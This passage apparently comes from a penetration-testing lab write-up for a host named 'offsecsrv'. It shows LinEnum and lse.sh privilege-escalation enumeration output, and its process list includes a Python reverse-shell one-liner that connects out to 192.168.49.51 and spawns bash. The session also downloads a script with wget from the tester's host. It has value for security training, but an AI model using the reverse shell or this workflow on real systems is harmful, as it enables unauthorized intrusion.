root       840  0.0  0.0   1976   828 ?        Ss   02:43   0:00 anacron -s
root       843  0.0  0.0   2372   892 ?        Ss   02:43   0:00 cron
daemon     844  0.0  0.0   2244   432 ?        Ss   02:43   0:00 atd
mysql      917  0.0  1.7 145780 18408 ?        Ssl  02:43   0:00 /usr/sbin/mysqld
root       948  0.0  0.2   6696  2568 ?        Ss   02:43   0:00 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
root      1036  0.0  0.0      0     0 ?        S    02:43   0:00 [vmmemctl]
root      1282  0.0  0.8  41864  8692 ?        Ss   02:43   0:00 /usr/sbin/apache2 -k start
www-data  1303  0.0  0.6  42472  6700 ?        S    02:43   0:00 /usr/sbin/apache2 -k start
www-data  1304  0.0  0.5  42432  5912 ?        S    02:43   0:00 /usr/sbin/apache2 -k start
www-data  1305  0.0  0.5  42432  5904 ?        S    02:43   0:00 /usr/sbin/apache2 -k start
www-data  1306  0.0  0.6  42472  6644 ?        S    02:43   0:00 /usr/sbin/apache2 -k start
www-data  1307  0.0  0.5  42160  5856 ?        S    02:43   0:00 /usr/sbin/apache2 -k start
root      1314  0.0  0.4  36960  4416 ?        Sl   02:43   0:00 /usr/sbin/vmtoolsd
root      1383  0.0  0.0   1788   564 tty1     Ss+  02:43   0:00 /sbin/getty -8 38400 tty1
root      1702  0.0  0.2   5548  2116 ?        Ss   02:46   0:00 /usr/sbin/sshd -D
www-data  1784  0.0  0.5  42168  5864 ?        S    02:47   0:00 /usr/sbin/apache2 -k start
www-data  1790  0.0  0.0   1828   532 ?        S    02:47   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data  1791  0.0  0.4   7740  4268 ?        S    02:47   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data  1792  0.0  0.1   3032  1644 pts/0    Ss   02:47   0:00 /bin/bash
root      1796  0.0  0.0   1828   524 ?        S    02:48   0:00 /bin/sh -c nice run-parts --report /etc/cron.daily
root      1798  0.0  0.0   1752   508 ?        SN   02:48   0:00 run-parts --report /etc/cron.daily
root      1805  0.0  0.0   1828   572 ?        SN   02:48   0:00 /bin/sh /etc/cron.daily/apt
root      1827  0.0  0.0   1768   440 ?        SN   02:48   0:00 sleep 1651
root      1835  0.0  0.0      0     0 ?        S    02:57   0:00 [flush-8:0]
www-data  1839  0.0  0.1   3372  1744 pts/0    S+   02:58   0:00 /bin/bash ./linenum.sh
www-data  1840  0.0  0.1   3396  1348 pts/0    S+   02:58   0:00 /bin/bash ./linenum.sh
www-data  1841  0.0  0.0   1768   444 pts/0    S+   02:58   0:00 tee -a
www-data  2034  0.0  0.1   3388  1056 pts/0    S+   02:58   0:00 /bin/bash ./linenum.sh
www-data  2035  0.0  0.0   2432   972 pts/0    R+   02:58   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  818232 Apr 18  2010 /bin/bash
lrwxrwxrwx 1 root root       4 Nov  8  2011 /bin/sh -> dash
-rwxr-xr-x 1 root root   18360 Jan 20  2011 /sbin/getty
-rwxr-xr-x 1 root root  108204 Jan 21  2011 /sbin/init
-rwxr-xr-x 1 root root  515044 Mar  7  2010 /sbin/wpa_supplicant
lrwxrwxrwx 1 root root      34 Nov  9  2011 /usr/sbin/apache2 -> ../lib/apache2/mpm-prefork/apache2
-rwxr-xr-x 1 root root  431944 Nov  2  2010 /usr/sbin/cupsd
-rwxr-xr-x 1 root root  158396 May 26  2011 /usr/sbin/modem-manager
-rwxr-xr-x 1 root root 8433352 Feb 10  2011 /usr/sbin/mysqld
-rwxr-xr-x 1 root root  425196 Jun 17  2011 /usr/sbin/sshd
lrwxrwxrwx 1 root root      37 Feb 27  2015 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd


[-] /etc/init.d/ binary permissions:
total 220
drwxr-xr-x   2 root root  4096 Nov  9  2011 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root    24 Jul 19  2011 .depend.boot
-rw-r--r--   1 root root    24 Jul 19  2011 .depend.start
-rw-r--r--   1 root root    10 Jul 19  2011 .depend.stop
-rw-r--r--   1 root root     0 Jul 19  2011 .legacy-bootordering
-rw-r--r--   1 root root  1510 Jun  8  2011 README
-rwxr-xr-x   1 root root   652 Jul  9  2010 acpi-support
lrwxrwxrwx   1 root root    21 Nov  8  2011 acpid -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 alsa-mixer-save -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 anacron -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  6157 Sep  1  2011 apache2
-rwxr-xr-x   1 root root  4106 Jan 20  2011 apparmor
lrwxrwxrwx   1 root root    21 Nov  8  2011 apport -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 atd -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 avahi-daemon -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1785 Feb 17  2010 binfmt-support
-rwxr-xr-x   1 root root  1091 Apr  9  2010 bluetooth
-rwxr-xr-x   1 root root  2341 Sep  7  2009 bootlogd
-rwxr-xr-x   1 root root  2191 Feb 16  2010 brltty
lrwxrwxrwx   1 root root    21 Nov  8  2011 console-setup -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 cron -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  3095 Nov  2  2010 cups
lrwxrwxrwx   1 root root    21 Nov  8  2011 dbus -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 dmesg -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1235 Feb 20  2009 dns-clean
lrwxrwxrwx   1 root root    21 Nov  8  2011 failsafe-x -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1623 Feb 15  2010 fancontrol
-rwxr-xr-x   1 root root  1105 Apr 27  2011 grub-common
-rwxr-xr-x   1 root root  1329 Sep  7  2009 halt
lrwxrwxrwx   1 root root    21 Nov  8  2011 hostname -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 hwclock -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 hwclock-save -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 irqbalance -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  1893 Apr 19  2010 kerneloops
-rwxr-xr-x   1 root root  1293 Sep  7  2009 killprocs
-rwxr-xr-x   1 root root   866 Feb 15  2010 lm-sensors
lrwxrwxrwx   1 root root    21 Nov  8  2011 module-init-tools -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  9  2011 mysql -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 network-interface -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 network-interface-security -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 network-manager -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2256 Dec  3  2009 networking
-rwxr-xr-x   1 root root   882 Sep  7  2009 ondemand
-rwxr-xr-x   1 root root  2398 Mar  6  2010 pcmciautils
lrwxrwxrwx   1 root root    21 Nov  8  2011 plymouth -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 plymouth-log -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 plymouth-splash -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 plymouth-stop -> /lib/init/upstart-job
-rwxr-xr-x   1 root root   420 Mar  6  2010 pppd-dns
lrwxrwxrwx   1 root root    21 Nov  8  2011 procps -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2228 Mar 26  2010 pulseaudio
-rwxr-xr-x   1 root root  8863 Jun  8  2011 rc
-rwxr-xr-x   1 root root   801 Sep  7  2009 rc.local
-rwxr-xr-x   1 root root   117 Jun  8  2011 rcS
-rwxr-xr-x   1 root root   639 Sep  7  2009 reboot
-rwxr-xr-x   1 root root  4400 Apr  8  2011 rsync
lrwxrwxrwx   1 root root    21 Nov  8  2011 rsyslog -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2271 Apr 14  2010 saned
lrwxrwxrwx   1 root root    21 Nov  8  2011 screen-cleanup -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  3247 Jun  8  2011 sendsigs
-rwxr-xr-x   1 root root   590 Sep  7  2009 single
-rw-r--r--   1 root root  4271 Jun  8  2011 skeleton
-rwxr-xr-x   1 root root  2014 Apr 15  2010 speech-dispatcher
-rwxr-xr-x   1 root root  4389 Jun 17  2011 ssh
-rwxr-xr-x   1 root root   519 Sep  7  2009 stop-bootlogd
-rwxr-xr-x   1 root root  1095 Sep  7  2009 stop-bootlogd-single
lrwxrwxrwx   1 root root    21 Nov  8  2011 udev -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 udev-finish -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 udevmonitor -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 udevtrigger -> /lib/init/upstart-job
lrwxrwxrwx   1 root root    21 Nov  8  2011 ufw -> /lib/init/upstart-job
-rwxr-xr-x   1 root root  2787 Nov  5  2009 umountfs
-rwxr-xr-x   1 root root  2075 Oct 14  2009 umountnfs.sh
-rwxr-xr-x   1 root root  2206 Jun  9  2011 umountroot
-rwxr-xr-x   1 root root   810 Jan 10  2011 unattended-upgrades
-rwxr-xr-x   1 root root  1997 Sep  7  2009 urandom
-rwxr-xr-x   1 root root  2327 Mar  7  2010 wpa-ifupdown
-rwxr-xr-x   1 root root  1777 Jul  1  2008 x11-common


[-] /etc/init/ config file permissions:
total 236
drwxr-xr-x   2 root root  4096 Feb 27  2015 .
drwxr-xr-x 131 root root 12288 Mar 30  2021 ..
-rw-r--r--   1 root root   320 Apr 29  2010 acpid.conf
-rw-r--r--   1 root root   305 Mar 28  2010 alsa-mixer-save.conf
-rw-r--r--   1 root root   278 Mar  4  2010 anacron.conf
-rw-r--r--   1 root root  1299 Apr 19  2010 apport.conf
-rw-r--r--   1 root root   261 Jan 14  2011 atd.conf
-rw-r--r--   1 root root   647 Mar  4  2011 avahi-daemon.conf
-rw-r--r--   1 root root   518 Mar 12  2010 console-setup.conf
-rw-r--r--   1 root root   356 Apr  1  2010 control-alt-delete.conf
-rw-r--r--   1 root root   297 Apr 14  2010 cron.conf
-rw-r--r--   1 root root   438 Mar  4  2011 dbus.conf
-rw-r--r--   1 root root   273 Feb 24  2010 dmesg.conf
-rw-r--r--   1 root root   291 Apr  1  2010 failsafe-x.conf
-rw-r--r--   1 root root   312 Mar 10  2010 hostname.conf
-rw-r--r--   1 root root   444 Mar 22  2010 hwclock-save.conf
-rw-r--r--   1 root root   557 Mar 22  2010 hwclock.conf
-rw-r--r--   1 root root   553 Feb 26  2010 irqbalance.conf
-rw-r--r--   1 root root   367 Apr 14  2010 module-init-tools.conf
-rw-r--r--   1 root root   349 Apr 26  2010 mountall-net.conf
-rw-r--r--   1 root root   261 Apr 26  2010 mountall-reboot.conf
-rw-r--r--   1 root root  1201 Apr 26  2010 mountall-shell.conf
-rw-r--r--   1 root root  1043 Oct  7  2010 mountall.conf
-rw-r--r--   1 root root   427 Apr 26  2010 mounted-dev.conf
-rw-r--r--   1 root root  1149 Apr 26  2010 mounted-tmp.conf
-rw-r--r--   1 root root   490 Apr 26  2010 mounted-varrun.conf
-rw-r--r--   1 root root  1044 Feb 10  2011 mysql.conf
-rw-r--r--   1 root root  1611 Jan  4  2011 network-interface-security.conf
-rw-r--r--   1 root root   740 Jan  4  2011 network-interface.conf
-rw-r--r--   1 root root   330 May 26  2011 network-manager.conf
-rw-r--r--   1 root root   332 Feb 19  2010 networking.conf
-rw-r--r--   1 root root   326 Apr 27  2010 plymouth-log.conf
-rw-r--r--   1 root root   888 Apr 27  2010 plymouth-splash.conf
-rw-r--r--   1 root root   731 Apr 27  2010 plymouth-stop.conf
-rw-r--r--   1 root root   996 Apr 27  2010 plymouth.conf
-rw-r--r--   1 root root   293 Dec 16  2009 procps.conf
-rw-r--r--   1 root root  1513 Apr  1  2010 rc-sysinit.conf
-rw-r--r--   1 root root   387 Apr  1  2010 rc.conf
-rw-r--r--   1 root root   822 Apr  1  2010 rcS.conf
-rw-r--r--   1 root root   343 Dec 10  2010 rsyslog.conf
-rw-r--r--   1 root root   683 Aug 17  2010 screen-cleanup.conf
-rw-r--r--   1 root root   612 Jun 17  2011 ssh.conf
-rw-r--r--   1 root root   228 Apr  1  2010 tty1.conf
-rw-r--r--   1 root root   213 Apr  1  2010 tty2.conf
-rw-r--r--   1 root root   213 Apr  1  2010 tty3.conf
-rw-r--r--   1 root root   213 Apr  1  2010 tty4.conf
-rw-r--r--   1 root root   213 Apr  1  2010 tty5.conf
-rw-r--r--   1 root root   213 Apr  1  2010 tty6.conf
-rw-r--r--   1 root root   769 Apr 19  2010 udev-finish.conf
-rw-r--r--   1 root root   316 Apr 19  2010 udev.conf
-rw-r--r--   1 root root   356 Apr 19  2010 udevmonitor.conf
-rw-r--r--   1 root root   318 Apr 19  2010 udevtrigger.conf
-rw-r--r--   1 root root   473 Mar  5  2010 ufw.conf
-rw-r--r--   1 root root   313 Apr  1  2010 upstart-udev-bridge.conf
-rw-r--r--   1 root root   683 Feb 17  2010 ureadahead-other.conf
-rw-r--r--   1 root root   889 Feb 17  2010 ureadahead.conf
-r--r--r--   1 root root   915 Feb 27  2015 vmware-tools.conf


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.7.2p1


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.1.41, for debian-linux-gnu (i486) using readline 6.1


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc


[-] Installed compilers:
ii  gcc                                  4:4.4.3-1ubuntu1                                The GNU C compiler
ii  gcc-4.4                              4.4.3-4ubuntu5                                  The GNU C compiler
ii  libprotoc5                           2.2.0a-0.1ubuntu1                               protocol buffers compiler library
ii  protobuf-compiler                    2.2.0a-0.1ubuntu1                               compiler for protocol buffer definition file


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1671 Nov  9  2011 /etc/passwd
-rw-r--r-- 1 root root 786 Nov  9  2011 /etc/group
-rw-r--r-- 1 root root 497 Jul 19  2011 /etc/profile
-rw-r----- 1 root shadow 1041 Mar 24  2020 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 26456 Mar 11  2010 /bin/ping6
-rwsr-xr-x 1 root root 51224 Jan 20  2011 /bin/umount
-rwsr-xr-x 1 root root 72188 Jan 20  2011 /bin/mount
-rwsr-xr-x 1 root root 26244 Feb 11  2011 /bin/fusermount
-rwsr-xr-x 1 root root 31100 Feb 14  2011 /bin/su
-rwsr-xr-x 1 root root 34756 Mar 11  2010 /bin/ping
-rwsr-xr-- 1 root messagebus 42492 Mar  4  2011 /lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 127668 Jan 19  2011 /usr/bin/sudo
-rwsr-xr-x 1 root root 53812 Feb 14  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root lpadmin 13540 Nov  2  2010 /usr/bin/lppasswd
-rwsr-xr-x 1 root root 36180 Feb 14  2011 /usr/bin/chfn
-rwsr-xr-x 1 root root 52092 Mar  6  2010 /usr/bin/mtr
-rwsr-sr-x 1 root root 9664 Apr  8  2010 /usr/bin/X
-rwsr-xr-x 1 root root 127668 Jan 19  2011 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 26784 Feb 14  2011 /usr/bin/newgrp
-rwsr-xr-x 1 root root 37140 Feb 14  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 13820 Mar 11  2010 /usr/bin/arping
-rwsr-sr-x 1 daemon daemon 42752 Jan 14  2011 /usr/bin/at
-rwsr-xr-x 1 root root 31700 Feb 14  2011 /usr/bin/chsh
-rwsr-xr-x 1 root root 13952 Mar 11  2010 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 18056 Apr 19  2011 /usr/bin/pkexec
-rwsr-xr-x 1 root root 5548 Nov  9  2009 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Feb 27  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 10224 Feb 27  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 9720 Apr 19  2011 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 182464 Jun 17  2011 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 9676 Jan 21  2011 /usr/lib/pt_chown
-rwsr-xr-- 1 root dip 273312 Mar  6  2010 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid 13848 Jan 20  2011 /usr/sbin/uuidd


[-] SGID files:
-rwxr-sr-x 1 root tty 13864 Jan 20  2011 /usr/bin/wall
-rwxr-sr-x 1 root crontab 31656 Apr 14  2010 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 79240 Jun 17  2011 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 9760 Jan 14  2010 /usr/bin/mail-lock
-rwxr-sr-x 1 root utmp 340604 Aug 17  2010 /usr/bin/screen
-rwxr-sr-x 1 root shadow 18104 Feb 14  2011 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 53428 Feb 14  2011 /usr/bin/chage
-rwxr-sr-x 1 root tty 9708 Nov 10  2009 /usr/bin/bsd-write
-rwsr-sr-x 1 root root 9664 Apr  8  2010 /usr/bin/X
-rwxr-sr-x 1 root mail 9760 Jan 14  2010 /usr/bin/mail-unlock
-rwxr-sr-x 1 root mlocate 30316 Mar 24  2010 /usr/bin/mlocate
-rwxr-sr-x 1 root mail 13924 Jan 14  2010 /usr/bin/dotlockfile
-rwsr-sr-x 1 daemon daemon 42752 Jan 14  2011 /usr/bin/at
-rwxr-sr-x 1 root mail 9760 Jan 14  2010 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root utmp 354444 Mar 31  2010 /usr/bin/xterm
-rwxr-sr-x 1 root mail 9720 Jun 25  2010 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root utmp 13980 Jul 14  2010 /usr/lib/libvte9/gnome-pty-helper
-r-xr-sr-x 1 root games 104780 Apr 13  2010 /usr/games/mahjongg
-r-xr-sr-x 1 root games 128608 Apr 13  2010 /usr/games/quadrapassel
-r-xr-sr-x 1 root games 134496 Apr 13  2010 /usr/games/gnomine
-rwsr-sr-x 1 libuuid libuuid 13848 Jan 20  2011 /usr/sbin/uuidd
-rwxr-sr-x 1 root shadow 30344 May 31  2011 /sbin/unix_chkpwd


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r----- 1 root fuse 216 Feb 11  2011 /etc/fuse.conf
-rw-r--r-- 1 root root 34 Jul 19  2011 /etc/ld.so.conf
-rw-r--r-- 1 root root 2981 Jul 19  2011 /etc/adduser.conf
-rw-r--r-- 1 root root 885 Nov  5  2009 /etc/insserv.conf
-rw-r--r-- 1 root root 552 Apr 13  2010 /etc/pam.conf
-rw-r--r-- 1 root root 2028 Dec 16  2009 /etc/sysctl.conf
-rw-r--r-- 1 root root 600 Jan 27  2010 /etc/deluser.conf
-rw-r--r-- 1 root root 1343 Jan  9  2007 /etc/wodim.conf
-rw-r--r-- 1 root root 350 Nov  8  2011 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 1309 Apr 19  2010 /etc/kerneloops.conf
-rw-r--r-- 1 root root 599 Mar  6  2010 /etc/logrotate.conf
-rw-r--r-- 1 root root 645 Mar  7  2010 /etc/ts.conf
-rw-r--r-- 1 root root 2064 Nov 23  2006 /etc/netscsid.conf
-rw-r--r-- 1 root root 2987 Apr 22  2010 /etc/gai.conf
-rw-r--r-- 1 root root 167 Nov  8  2011 /etc/kernel-img.conf
-rw-r--r-- 1 root root 7649 Jul 19  2011 /etc/pnm2ppa.conf
-rw-r--r-- 1 root root 2969 Apr  9  2010 /etc/debconf.conf
-rw-r--r-- 1 root root 8596 Feb 15  2010 /etc/sensors3.conf
-rw-r--r-- 1 root root 300 Mar 24  2010 /etc/updatedb.conf
-rw-r--r-- 1 root root 4794 Apr 22  2010 /etc/hdparm.conf
-rw-r--r-- 1 root root 26 Feb  5 21:46 /etc/resolv.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
-rw-r--r-- 1 root root 3587 Sep  2  2010 /etc/lftp.conf
-rw-r--r-- 1 root root 6332 Jul 19  2011 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 321 Mar 22  2010 /etc/blkid.conf
-rw-r--r-- 1 root root 801 Apr 19  2010 /etc/mke2fs.conf
-rw-r--r-- 1 root root 1217 Feb 24  2010 /etc/rsyslog.conf
-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf
-rw-r--r-- 1 root root 92 Apr 23  2010 /etc/host.conf
-rw-r--r-- 1 root root 513 Jul 19  2011 /etc/nsswitch.conf
-rw-r--r-- 1 root root 624 Nov 13  2009 /etc/mtools.conf


[-] Location and Permissions (if accessible) of .bak file(s):
-rw------- 1 root shadow 648 Nov  9  2011 /var/backups/gshadow.bak
-rw------- 1 root root 786 Nov  9  2011 /var/backups/group.bak
-rw------- 1 root root 1671 Nov  9  2011 /var/backups/passwd.bak
-rw------- 1 root shadow 1041 Mar 23  2020 /var/backups/shadow.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Jul 19  2011 .
drwxr-xr-x 16 root root 4096 Nov  9  2011 ..


### SCAN COMPLETE ####################################
www-data@offsecsrv:/tmp$ 
```

### lse.sh
```
www-data@offsecsrv:/$ cd /tmp
cd /tmp
www-data@offsecsrv:/tmp$ wget 192.168.162.41/lse.sh
wget 192.168.162.41/lse.sh
--2022-01-29 09:38:14--  http://192.168.162.41/lse.sh
Connecting to 192.168.162.41:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2022-01-29 09:38:14 ERROR 404: Not Found.

www-data@offsecsrv:/tmp$ wget 192.168.49.162/lse.sh 
wget 192.168.49.162/lse.sh
--2022-01-29 09:38:30--  http://192.168.49.162/lse.sh
Connecting to 192.168.49.162:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: `lse.sh'

100%[======================================>] 43,570       124K/s   in 0.3s    

2022-01-29 09:38:31 (124 KB/s) - `lse.sh' saved [43570/43570]

www-data@offsecsrv:/tmp$ chmod +x lse.sh
chmod +x lse.sh
www-data@offsecsrv:/tmp$ ./lse.sh
./lse.sh
\e[90m---
\e[97mIf you know the current user password, write it here to check sudo privileges: \e[0;0m

\e[90m---

\e[96m LSE Version:\e[0;0m 3.7

\e[94m        User:\e[0;0m www-data
\e[94m     User ID:\e[0;0m 33
\e[94m    Password:\e[0;0m \e[90mnone\e[0;0m
\e[94m        Home:\e[0;0m /var/www
\e[94m        Path:\e[0;0m /usr/local/bin:/usr/bin:/bin
\e[94m       umask:\e[0;0m 0022

\e[94m    Hostname:\e[0;0m offsecsrv
\e[94m       Linux:\e[0;0m 2.6.32-21-generic
\e[94mDistribution:\e[0;0m Ubuntu 10.04.3 LTS
\e[94mArchitecture:\e[0;0m i686

\e[35m==================================================================(\e[32m users \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr000\e[97m Current user groups\e[90m.............................................\e[34m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr010\e[97m Is current user in an administrative group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr020\e[97m Are there other users in administrative groups?\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr030\e[97m Other users with shell\e[90m..........................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr040\e[97m Environment information\e[90m......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr050\e[97m Groups for other users\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr060\e[97m Other users\e[90m..................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90musr070\e[97m PATH variables defined inside /etc\e[90m..............................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90musr080\e[97m Is '.' in a PATH variable defined inside /etc?\e[90m.................. \e[90mnope\e[0;0m
\e[35m===================================================================(\e[32m sudo \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msud000\e[97m Can we sudo without a password?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msud010\e[97m Can we list sudo commands without a password?\e[90m...................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
usage: sudo -h | -K | -k | -L | -V
usage: sudo -v [-AknS] [-p prompt]
usage: sudo -l[l] [-AknS] [-g groupname|#gid] [-p prompt] [-U username] [-u
            username|#uid] [-g groupname|#gid] [command]
usage: sudo [-AbEHknPS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
            username|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
            username|#uid] file ...
\e[90m---\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud040\e[97m Can we read sudoers files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud050\e[97m Do we know if any other users used sudo?\e[90m........................ \e[90mnope\e[0;0m
\e[35m============================================================(\e[32m file system \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst000\e[97m Writable files outside user's home\e[90m..............................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst010\e[97m Binaries with setuid bit\e[90m........................................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst020\e[97m Uncommon setuid binaries\e[90m........................................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/lppasswd
/usr/bin/X
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
\e[90m---\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst030\e[97m Can we write to any setuid binary?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst040\e[97m Binaries with setgid bit\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst050\e[97m Uncommon setgid binaries\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst060\e[97m Can we write to any setgid binary?\e[90m.............................. \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mfst070\e[97m Can we read /root?\e[90m.............................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst080\e[97m Can we read subdirectories under /home?\e[90m......................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst090\e[97m SSH files in home directories\e[90m................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst100\e[97m Useful binaries\e[90m.................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst110\e[97m Other interesting files in home directories\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst120\e[97m Are there any credentials in fstab/mtab?\e[90m........................ \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst130\e[97m Does 'www-data' have mail?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst140\e[97m Can we access other users mail?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst150\e[97m Looking for GIT/SVN repositories\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst160\e[97m Can we write to critical files?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst170\e[97m Can we write to critical directories?\e[90m........................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst180\e[97m Can we write to directories from PATH defined in /etc?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst190\e[97m Can we read any backup?\e[90m......................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst200\e[97m Are there possible credentials in any shell history file?\e[90m....... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst210\e[97m Are there NFS exports with 'no_root_squash' option?\e[90m............. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst220\e[97m Are there NFS exports with 'no_all_squash' option?\e[90m.............. \e[90mnope\e[0;0m
